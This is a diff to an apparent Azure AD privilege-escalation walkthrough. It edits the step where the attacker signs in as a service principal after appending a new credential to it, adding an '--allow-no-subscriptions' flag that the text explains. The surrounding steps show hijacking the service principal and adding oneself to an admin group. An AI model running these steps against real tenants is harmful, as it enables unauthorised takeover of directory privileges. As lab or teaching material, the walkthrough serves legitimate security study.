@@ -54,9 +54,14 @@ az ad sp credential reset --id <sp-object-id> --append
 
 ### Step 3 — Authenticate as the service principal
 
+The service principal has no role on any subscription, so pass
+`--allow-no-subscriptions` — this attack is entirely directory-scoped (Microsoft
+Graph) and needs no subscription.
+
 ```bash
 az login --service-principal \
-  --username <appId> --password <password> --tenant <tenant>
+  --username <appId> --password <password> --tenant <tenant> \
+  --allow-no-subscriptions
 ```
 
 ### Step 4 — Add yourself to the admin group
